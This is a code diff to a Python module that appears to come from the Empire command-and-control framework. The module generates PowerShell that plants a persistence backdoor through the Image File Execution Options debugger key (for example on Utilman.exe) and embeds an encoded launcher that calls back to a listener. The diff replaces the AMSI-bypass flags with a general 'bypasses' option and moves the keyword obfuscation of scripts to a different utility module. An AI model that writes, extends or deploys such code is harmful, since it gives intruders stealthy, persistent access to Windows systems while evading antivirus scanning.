@@ -2,6 +2,8 @@ from __future__ import print_function
 
 from builtins import str
 from builtins import object
+
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
 
@@ -13,8 +15,6 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
         obfuscate = False
-        amsi_bypass = False
-        amsi_bypass2 = False
 
         # management options
         cleanup = params['Cleanup']        
@@ -29,10 +29,6 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            amsi_bypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            amsi_bypass2 = True
 
         status_msg = ""
         locationString = ""
@@ -40,7 +36,7 @@ class Module(object):
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for Utilman.exe
             script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(target_binary, target_binary)
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
             return script
@@ -56,8 +52,8 @@ class Module(object):
             else:
                 # generate the PowerShell one-liner
                 launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', obfuscate=obfuscate,
-                                                                   obfuscationCommand=obfuscate_command, AMSIBypass=amsi_bypass,
-                                                                   AMSIBypass2=amsi_bypass2)
+                                                               obfuscationCommand=obfuscate_command,
+                                                               bypasses=params['Bypasses'])
                 
                 enc_script = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -84,6 +80,6 @@ class Module(object):
 
         if obfuscate:
             script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
